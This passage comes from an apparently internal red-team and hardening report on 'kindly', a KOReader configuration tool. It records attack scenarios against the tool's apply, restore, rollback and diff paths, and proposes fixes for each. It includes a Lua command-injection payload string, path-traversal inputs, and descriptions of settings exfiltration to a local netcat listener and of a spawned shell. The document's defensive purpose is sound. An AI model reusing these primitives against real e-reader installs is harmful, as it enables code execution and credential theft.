warning to block, and route every change-renderer (apply human,
diff human, JSON envelope) through a shared SECRET redactor.
**Share the SENSITIVE detector between `apply` and `setup import` so
every other SENSITIVE-keys fix covers both paths — otherwise plain
`kindly apply --file friend.yaml` bypasses the entire trust
boundary.** **Close the rollback/restore/snapshot channel with an
HMAC'd machine-local marker so attacker-minted tars can't be
ingested via `kindly restore` without explicit `--from-untrusted`,
which runs the full setup-import pipeline** — and extend the
scanner inside that pipeline to every file in `SNAPSHOT_PATHS` that
KOReader `dofile`s (not just `plugins/` + `patches/`), including a
reject of `.old` siblings which have no legitimate reason to ship.
**Replace the gzip-ISIZE-based bomb cap with a streaming-counter
sink**, since ISIZE wraps at 4 GiB and a 4.1 GiB bomb slips past
all three current caps. **Add a Zod strict schema + per-line HMAC
+ `flock` to `history.jsonl`**, because today a single appended
line + `kindly rollback --to N` lands attacker Lua on-device, and
the same file races to duplicate indexes under concurrent writers.
**Add an advisory `flock` on settings.reader.lua read-modify-write**
for the macOS desktop live-head target where KOReader is not
quiesced by the USB-mount invariant. **Split EPHEMERAL into
volatile vs. PII tiers** so `--full` stops silently widening to
paths and search queries. **Drop `TAR_OPTIONS`/`LANG` env on every
`spawnSync("tar", …)` call** so a GNU-tar Linux install can't
invert every path-safety check via `--transform`. And **parser/
shape guards on settings.reader.lua itself** — non-plain-table
top-level, recursion-depth cap, `plugins_disabled` map-only — so
an attacker-planted settings file can't DoS every kindly command
that parses it or silently re-enable every disabled plugin via
array-form. None of these change the default UX for catalogued
well-formed Setups — only the ones trying to slip code-exec,
credential leaks, or DoS past the trust boundary."

---

## 9. Red-team scenarios not yet run

- **S5 — downgrade to catalog-pinned vulnerable plugin.** Mechanism:
  attacker ships plugin bytes matching kindly's *stale* catalog;
  device runs a newer KOReader where that plugin was fixed. Import
  downgrades the plugin. Confirmed mechanism: verification uses
  kindly's own catalog, not the manifest. Version-skew note fires but
  does not block. Weaponization requires a real CVE-fixed plugin
  whose old hash kindly pins — worth a review of catalog staleness
  policy more than a local demo.
- **S6 — TOCTOU on fat install.** Race between extraction and
  verification (if any window exists). Hardware-specific, not easily
  demo'd in a local fixture.
- ~~**S29 — snapshot/restore round-trip.**~~ ✅ **Covered 2026-04-23
  by S44 + S46 + S47.** S44 proved rollback has no W31 equivalent;
  S46 proved `kindly restore` is the same gate-free path with a
  single-file attack artifact; S47 proved the full snapshot→restore
  round-trip using kindly's own tools end-to-end. The auto-pre-import
  snapshot itself is benign (captures pre-attack state); the
  compromise propagates through *subsequent* user snapshots (S47).
- **S31 — meta.name / meta.tags path-traversal.** `meta.name` becomes
  part of the setup ID and may touch filesystem paths
  (`~/.kindly/setups/<id>-<slug>.kset`). Malicious name like `../`
  sequences or null bytes — does `src/lib/setupExport.ts`'s slug
  function sanitize?

---

## 10. Kindly-side completeness battery (run 2026-04-23)

Five orthogonal surfaces swept against mounted-fixture. All defended;
one implicit-guard note worth recording.

### S31 — `meta.name` path-traversal / null-byte (defended)

- Export with `kindly setup export "../../../etc/pwned" …` →
  output lands at `~/.kindly/setups/7a2db1319d33-etc-pwned.kset.yaml`.
  Slug sanitizer strips the traversal sequence and leaves only
  `etc-pwned`. No file created at `/etc/pwned`.
- Import of a manifest carrying `meta.name: "../../etc/passwd"` →
  exit 0, display shows `importing ../../etc/passwd` but no
  filesystem touch outside the mount. Display surface is unsanitized
  (same class as S7 — meta fields pass through unfiltered), but the
  slug-to-filename path is clean.
- Null byte in `name` → display shows `foo bar` (NUL silently
  elided). No filesystem traversal.

**Note:** the display-side of `meta.name` is vulnerable to the same
ANSI injection as S7's `author` / `source_url` / `description` and
should be routed through the same sanitizer in the v0.11.2 fix.

### S32 — fat `.kset` declaration bomb (defended by structural guards)

Manifest declaring 50,000 phantom plugin files + 2 real ones
(3-line YAML block each). Archive contains only the 2 real files.

- Manifest YAML with 150,014 lines (~150 KB): **parsed successfully
  by the `yaml` library**, no parse-time cap hit.
- Zod schema accepted the 50,000-entry `plugins.files` array without
  rejection.
- Verification failed on the first phantom: `error: manifest declares
  plugins/bookshortcuts.koplugin/bogus_1.lua but archive doesn't
  contain it`. Exit 1.

**Status:** defended, but via implicit guard rather than explicit
ceiling. Kindly has **no** documented max-declared-files or
max-extract-size cap — the declared-∩-actual + hash-recompute check
makes a 50k-phantom attack useless because every declared entry must
exist and hash-match. A compression-bomb variant (50k tiny REAL files
expanding to multi-GB uncompressed) was not run here but remains the
lowest-effort next probe — if there's no extract-size ceiling in
`extractTarGz`, an attacker could force kindly's tmp dir to fill
during unpack before any validation fires. **Follow-up:** verify
`src/setup/unpack.ts`'s `extractTarGz` imposes a total-bytes cap, or
add one.

### S33 — manifest-claimed hash lies (defended, recomputed)

Manifest declares
`hash: sha256:0000…0000` for `bookshortcuts.koplugin/main.lua`
while the archive's actual bytes hash to
`7e75bc968827bb0da…`.

```
error: plugins/bookshortcuts.koplugin/main.lua:
  declared hash=sha256:0000…, actual=sha256:7e75bc96…
EXIT: 1
```

`src/setup/unpack.ts:138-144` hashes every declared file with
`hashBytes(buf)` and compares to the manifest's declaration. No
trust in attacker-supplied hashes. **No action.**

### S35 — YAML billion-laughs (defended by parser)

Manifest with nested YAML anchors expanding exponentially (9 levels
deep, 9^6 ≈ 530k nodes at full expansion):

```
error: …is not valid YAML: Excessive alias count indicates a
resource exhaustion attack
EXIT: 1
```

The `yaml` library (eemeli/yaml) has a built-in `maxAliasCount`
guard that fires before expansion. **No action** — the library's
default is load-bearing here; do not ever set `maxAliasCount: -1`
(unlimited) in `parseYamlSafe`.

### S37 — newline/CR injection in settings values (defended)

Payload:
```yaml
lastdir: "line1\nline2\"]=nil;os.execute(\"echo pwned > /tmp/s37.proof\");return {[\""
```

On-disk `settings.reader.lua` after import (hex view):

```
["lastdir"] = "line1\\n                       
```

The Lua writer escapes the embedded newline as literal backslash-n
(`\\n`). KOReader reads the value as the string `line1\nline2"]=...`
(with literal backslash-n), not as a newline-broken Lua expression.
No `/tmp/s37.proof` file created. **No action.**

---

## 11. KOReader-on-macOS as the live head

### 11.1 Why

KOReader is open source and ships a macOS build. Every severity claim
in §1 currently ends with "triggers on first boot / tap" based on a
static code read (`terminal.koplugin/main.lua:249` → `C.execlp`).
Running the real binary promotes three of the worst findings from
*theoretical* to *observed RCE*:

| Scenario | Static claim today | Live-run upgrade |
|----------|---------------------|------------------|
| S17/S9 ✅ **DONE 2026-04-23** | `terminal_shell` would exec on tap | **Observed.** KOReader log: `Terminal: spawning shell /tmp/pwn.sh`. Listener at `nc -l 4242` received `S17-RCE: claw@Busuiocs-MacBook-Air.local`. PTY `/dev/ttys005` allocated. See §1, S17 live-verification subsection. |
| S4 ✅ **DONE 2026-04-23** | patch loader would run the byte-table payload | **Observed.** Marker file written 3s after launch: `S4 patch executed on KOReader boot\n1776965616`. `POST /s4 HTTP/1.1` landed at `127.0.0.1:4242` with settings body. Scanner printed `no novel findings`. See §1, S4 live-verification subsection. |
| S3 ✅ **DONE 2026-04-23** | obfuscated plugin would POST on first boot | **Observed.** Marker written 4s after launch. `POST /s3` at `127.0.0.1:5353` carried **14,351 bytes of real settings body** (BookShortcuts_directory_action, LocalSend state, etc. all in plaintext). See §1, S3 live-verification subsection. |
| S38 ✅ **DONE 2026-04-23** (new finding, no prior static entry) | n/a — surface discovered during live-head session | **Observed.** `kindly apply --file friend-shared.yaml` exited 0 with no advisory for `terminal_shell` / `plugins_disabled.terminal`. Marker + `GET /s38` 200 at listener fired 7s after KOReader launch. **W31 is scoped to `setup import`; `apply` has no equivalent.** See §1, S38 subsection. |
| S42 ✅ **DONE 2026-04-23** (new finding, follow-up to S38) | n/a — extends S38 to the W31a-dual-gated key | **Observed.** `kindly apply` with plain YAML setting `extra_plugin_paths` → one-line diff, exit 0, no advisory. KOReader scanned the attacker's directory, dofile'd the plugin, marker + `GET /s42` 200 fired 4s after launch. **Strongest primitive in the red-team: bypasses `.kset`, catalog, scanner, and the W31a dual gate in one move.** See §1, S42 subsection. |
| S43 ✅ **DONE 2026-04-23** (new finding, third apply-path naked surface) | n/a — no static claim; found by auditing `src/lib/apply.ts` for classify imports | **Observed — two sub-attacks.** S43a: apply silently overwrote 5 SECRET keys (zlib/calibre/pinpadlock/LocalSend creds + kosync userkey) in one plain YAML. S43b: `apply --dry-run` stdout printed every victim plaintext in the `~ key "prev" → "next"` diff lines — self-exfil channel via screenshots/paste/bug reports. `src/lib/apply.ts` imports nothing from classify.ts; the diff renderer has no SECRET redaction. See §1, S43 subsection. |
| S44 ✅ **DONE 2026-04-23** (new finding, rollback-path naked surface) | n/a — no static claim; found by auditing `src/commands/rollback.ts` for trust gates | **Observed.** `kindly rollback <fake-snapshot-dir>` with zero flags: settings overwritten, 3 plugin/patch files extracted, plugin fired on boot, marker + `GET /s44` 200 4s after KOReader launch. Rollback is structurally `setup import --accept-plugins --accept-patches --accept-sensitive` minus all gates and all verification. See §1, S44 subsection. |
| S45 ✅ **DONE 2026-04-23** (new finding, generalizes S43b) | n/a — direct code-read + command-output capture | **Observed.** `kindly diff` uses an identical `renderChange` to apply and leaks the same SECRETs in `prev → next`. Amplifiers: diff is positioned as the safe read-only command, and its `git diff`-style exit code invites piping into logs / CI / cron drift-monitoring — every pipe is an exfil channel. `kindly doctor` and `kindly pull` both correctly avoid value leaks. See §1, S45 subsection. |
| S40 ✅ **DONE 2026-04-23** (promotes S7 from static to observed) | "ANSI injection would forge display" (static code read of schema.ts + setup.ts) | **Observed.** Lean `.kset.yaml` with YAML `\x1b`-hex escape in `meta.author` uses `\r` + bold-green SGR + `\x1b[K` to paint `(VERIFIED ✓ community-catalog-v1)` over the `(UNVERIFIED)` tag during `kindly setup import --dry-run`. Raw bytes captured in `/tmp/kindly-s40-live/raw-stdout.bin`: `0d 1b 5b 31 3b 33 32 6d … 1b 5b 30 6d 1b 5b 4b`. Chains with S4: bold-green "VERIFIED" header while scanner prints `no novel findings` and the patch silently lands on disk. No KOReader launch needed — the target surface is the kindly operator's terminal. See §1, S40 subsection. |
| S46 ✅ **DONE 2026-04-23** (sibling of S44, cleaner attack shape) | n/a — direct code audit of `src/commands/restore.ts` for classify imports | **Observed.** `kindly restore <attacker.tar.gz>` with zero flags: 4 files extracted (settings + 2 plugin files + 1 patch), `s46evil: init fired` in KOReader log, marker + `GET /s46` 200 at `127.0.0.1:4646` 4s after launch. Single-file attack artifact vs. S44's directory layout. "restored" framing + auto-safety-snapshot line mis-prime the user — looks like undoing harm, not installing code. See §1, S46 subsection. |
| S47 ✅ **DONE 2026-04-23** (end-to-end snapshot-as-distribution; closes S29) | n/a — realization from auditing `src/commands/snapshot.ts` that snapshots have no trust-tier metadata | **Observed.** Full chain using kindly's own tools: compromised attacker fixture → `kindly snapshot --label "my-cozy-pw5-setup"` → `my-reading-setup.tar.gz` (only warning is about plaintext secrets, zero warning about plugin code being included) → clean victim fixture → `kindly restore` → KOReader boot → `s47evil: init fired`, marker + `GET /s47` 200 4s after launch. Snapshot/restore pair IS the weaponization framework — no custom tooling. See §1, S47 subsection. |
| S48 ✅ **DONE 2026-04-23** (generalizes S43b/S45 to JSON envelope) | n/a — code audit of `src/schema/diff.ts` + `src/cli/json.ts` for classify-lookup, then independent CLI verification | **Observed.** `apply --dry-run --json` and `diff --json` both emit all 5 victim SECRET plaintexts in `prev`/`next` fields. `DiffResult.grouped` double-emits each change. JSON is the automation output — pipes into jq / CI / log stores multiply copies. §8.4 generalization scope grows from 2 renderers to 3: human apply, human diff, and the JSON envelope — all routed through one shared redactor. See §1, S48 subsection. |
| S49 ✅ **DONE 2026-04-23** (restore-path code-exec widens from 2 files to ≥5) | "restore-path code execution via plugins/patches only" (implicit) | **Observed.** Minimal attacker tar (`settings.reader.lua` + `defaults.custom.lua`, no plugin, no patch) delivered code-exec via `kindly restore`. Marker in **2s** — fastest observed primitive yet, because `LuaDefaults:open` runs very early in KOReader startup. Loader chain: `pcall(dofile, defaults.custom.lua)` at frontend/luadefaults.lua:29. Pattern extends statically to `history.lua` (readhistory.lua:110) and `settings.reader.lua.old` (luasettings.lua:37). §8.7 HMAC gate must cover the full tar, not just plugins/patches. See §1, S49 subsection. |
| S50 ✅ **DONE 2026-04-23** (symlink extraction bypasses path-safety) | "path-safety filter blocks all attacker-controlled extraction" (assumed invariant) | **Observed.** `kindly restore` extracts tar entries typed as symlinks with target intact. Three probes: (a) `stash -> /tmp/host-secret`, read-side sandbox breach confirmed; (b) `plugins/*-exfil -> /Users/claw/.ssh/...`, symlinks travel to snapshot (BSD tar no-deref — attacker-side exfil neutered); (c) `settings.reader.lua -> /tmp/other-install/...` cross-install bridging: `kindly diff` printed `"/home/someone-else" → "/mnt/us/documents"` as `prev`, `kindly pull --full` landed bridged non-SECRET keys in output YAML. SECRET filter catches credentials accidentally. Moderate severity: info-disclosure + invariant break, not RCE. Defense folds into §8.7 scope. See §1, S50 subsection. |
| S51 ✅ **DONE 2026-04-23** (rollback is a fourth tar-ingestion RCE surface) | n/a — discovered by auditing `src/commands/rollback.ts` for path anchoring | **Observed.** `kindly rollback /tmp/kindly-s51-live/attacker-snapshot --mount …` with zero extraction flags delivered `evil.koplugin/` to koreaderRoot at exit 0 with `✓ restored 2 plugin/patch file(s)`. KOReader launch → marker at 2s + `GET /s51 HTTP/1.1 200` at `127.0.0.1:4951`. `executeRollback` at rollback.ts:73 resolves any user-supplied dir against cwd with no `.kindly/` anchor. `--to <N>` variant inherits the primitive via history-jsonl line forgery (`findHistoryEntryByIndex` trusts every line verbatim — no HMAC). §8.7 scope now explicitly covers rollback + history-jsonl signing. See §1, S51 subsection. |
| S53 ✅ **DONE 2026-04-23** (`.kindly/` state world-readable, other-AI J-probe) | n/a — filesystem audit, no prior static claim | **Observed.** Fresh tmpdir, ran `kindly pull` + `apply`; `.kindly/` = `drwxr-xr-x` (755), `history.jsonl` = `-rw-r--r--` (644), `backups/<ts>/settings.reader.lua` = `-rw-r--r--` (644). `grep "leaked-secret-pw" backups/*/settings.reader.lua` confirmed plaintext SECRETs in backup file — `filterForYaml` not run on backups. `grep -rn "chmod\|umask" src/` returned zero hits. `CLAUDE.md` scopes as single-user but this is porous (shared macOS boxes, sync daemons under other UIDs, sandboxed indexers). Defense is §8.9: explicit 0700 on `.kindly/`, 0600 on every file inside. Same SECRET-leak class as S43, different channel (filesystem vs. stdout). |
| S52 ✅ **DONE 2026-04-23** (FIFO entries extracted → kindly-side DoS, other-AI probe) | n/a — discovered in E-probe hardlink/device-node/FIFO variants | **Observed.** Tar with a FIFO entry at `plugins/trap.koplugin/hang` passed `assertSafeArchive` (path clean, size trivial) and extracted as `prw-r--r--` FIFO by `kindly restore`. Any downstream tool that `readFileSync`s plugin files — `kindly doctor`, plugin hash verification inside `setup import --strict-imports`, the Lua scanner — blocks indefinitely on the FIFO read waiting for a writer. KOReader `dofile`/`loadfile` would block similarly. Severity: nuisance-grade DoS against kindly's own post-import commands, not code-exec. Hardlink variant on macOS defended by BSD tar rejecting `..` in linkname (not by kindly); GNU tar on Linux-Kindle untested. Chardev blocked by OS permissions (non-root). Defense: fold into §8.7's `tar -tvzf` mode-column filter — reject any entry whose mode-char is not `-` (regular) or `d` (directory). |

Screenshots / network captures are vastly more persuasive in the
hardening case than "see line 249".

### 11.2 Beyond red-team: live head for all config work

Use macOS KOReader as the reference runtime for kindly's config
functionality generally — not just red-team. Applications:

- **Schema drift detection.** kindly pins a 557-key schema from an
  older KOReader source extraction. HEAD KOReader may have added /
  renamed settings. A periodic "write known-set via kindly → launch
  KOReader → observe which keys it actually reads / ignores /
  complains about" dev loop catches drift before users do.
- **Preview truth.** docs/97 (GUI preview vision) wants pixel-accurate
  rendering of proposed settings. A real KOReader binary with kindly
  writing into its data dir IS the preview — no emulator, no
  screenshot patch needed for a lot of validation.
- **Behavior verification for SENSITIVE classifications.** When
  proposing "add `cover_image_path` to SENSITIVE", the proof isn't
  just "it's a path" — it's "we set it to a write-clobber target,
  launched KOReader, watched the file get overwritten". Every
  SENSITIVE candidate can be behaviorally validated.
- **Plugin re-enable cross-version matrix.** S27 confirmed
  `plugins_disabled.<name>: false` works on one KOReader. Matrix
  across 2024.x → HEAD shows whether the primitive generalizes or
  changed behavior in a release.

### 11.3 Minimum setup to make this a repeatable dev loop

Research delegated & completed 2026-04-23. Primary-source findings:

**Binary availability.** No official macOS build published. Every
release (including latest `v2026.03`) ships Android / Kindle / Kobo /
PocketBook / AppImage / deb — no darwin asset. No Homebrew formula.
**Build from source only.**

- Build recipe: `brew install autoconf automake bash binutils cmake
  coreutils findutils gettext gnu-getopt libtool make meson nasm ninja
  pkgconf sdl3 util-linux`, then `./kodev build && ./kodev run`
  (https://github.com/koreader/koreader/blob/master/doc/Building.md).
  First build ~10–30 min on Apple Silicon (CRengine + MuPDF + kpvcrlib
  are the heavy leaves).
- `.app` bundle script:
  https://github.com/koreader/koreader/blob/master/platform/mac/do_mac_bundle.sh
  (produces `koreader.app`, 7z-compressed optionally).

**Data-dir redirection — the critical hook is `KO_HOME`.** Source:
`datastorage.lua → DataStorage:getDataDir()`. Priority order:

1. `KO_HOME` env var ← **this is the hook**
2. `APPIMAGE` / `FLATPAK`
3. `$XDG_CONFIG_HOME/koreader`
4. `~/Library/Application Support/koreader` (macOS default)
5. `.` (cwd, used by dev emulator builds)

`KO_HOME=<fixture> ./koreader/koreader.sh` makes KOReader read
`settings.reader.lua`, `plugins/`, `patches/` from the fixture path.
Exactly the shape kindly needs — **the live-head plan is viable**.

**Headless / scriptable.** No headless flag. `reader.lua` CLI accepts
only `-d`, `-v`, `-p`, `-h`. Always calls `UIManager:run()`
(https://github.com/koreader/koreader/blob/master/reader.lua).

Workaround: scripted UI via **user patch**. Drop
`patches/2-autorun.lua` in the data dir — `userpatch.lua` loads it
late, it calls menu actions then `UIManager:quit()`. Standard CI
trick.

**Plugin loading on macOS.** Same `plugins/*.koplugin/` scan as
device. No macOS-specific disable list. **Terminal plugin is
functional on macOS**: the gate is POSIX PTY capability
(`/dev/ptmx`, `grantpt`, `unlockpt`) — macOS has all three. Plugin
returns `{disabled=true}` only when PTY ops fail. **S17 live-run
plan is viable.** (Confirm on first run: SDL emulator's `Device`
module may report as generic desktop that affects plugin capability
checks.)

**Observability.** stdout/stderr (with `-v`), file writes under
`KO_HOME`, `crash.log`, exit code. For red-team runs: `fs_usage` on
the process + local HTTP listener (`nc -l 4242` or trivial bun
server) to catch exfil POSTs.

**Version matrix.** Every macOS version is from-source. SDL3 dep is
recent — tags pre ~2024.x may need SDL2 and a different brew list.
Pin 3–4 tags around the SDL2→SDL3 cutover (e.g. 2024.04, 2025.04,
2025.10, HEAD) rather than full range.

**Gotchas.**
- SDL emulator uses the same runtime paths as device code (same
  `DataStorage` module) — plugin/patch/settings behavior is genuine.
- macOS is a documented dev platform but second-class vs. Linux;
  expect occasional brew-dep churn.
- `Device` abstraction on emulator reports `emulator` — some plugins
  gate on `Device:isTouchDevice()` / `Device:hasKeyboard()`; verify
  per-plugin before asserting parity with real Kindle.
- No official signing for the built `.app`; Gatekeeper quarantine on
  first launch.
- `SDL_FILESYSTEM_BASE_DIR_TYPE=bundle` in the `.app` variant
  resolves paths inside the bundle — for fixture redirection use
  `KO_HOME` explicitly, don't rely on cwd.

**Concrete wiring next session:**

- One-time: `brew install` the dep list, clone koreader, `./kodev build`.
- Per-test: `scripts/koreader-roundtrip.sh <kset>` — import via
  kindly into `/tmp/koreader-fixture`, `KO_HOME=/tmp/koreader-fixture
  ./koreader/koreader.sh &`, `nc -l 4242` in parallel, capture
  `fs_usage`, kill after 30s.
- For scripted UI triggering: drop
  `/tmp/koreader-fixture/patches/2-autorun.lua` that calls the menu
  action and exits.
- Multi-version matrix: separate build dirs, separate `KO_HOME`
  fixtures, same script targets each.

### 11.4 First three runs once KOReader-on-macOS is wired up

In priority order:

1. ~~**S17 live.**~~ **Done 2026-04-23.** See the S17 live-verification
   subsection in §1. Listener hit, marker file, KOReader log all
   captured.
2. ~~**S4 live.**~~ **Done 2026-04-23.** See the S4 live-verification
   subsection in §1. Marker + listener POST + installed patch on disk
   all captured. Scanner printed the misleading "no novel findings"
   all-clear as predicted.
3. ~~**S3 live.**~~ **Done 2026-04-23.** See the S3 live-verification
   subsection in §1. Marker + full settings body (14,351 bytes) on
   listener + installed plugin on disk all captured.

Anything that fails to actually execute in a live KOReader drops in
severity — e.g., if the Terminal plugin isn't reachable from the
tools menu in the default 2024.x build without other prerequisites,
S17 stays "settings-only code-exec surface" rather than "one-tap RCE"
for that version.
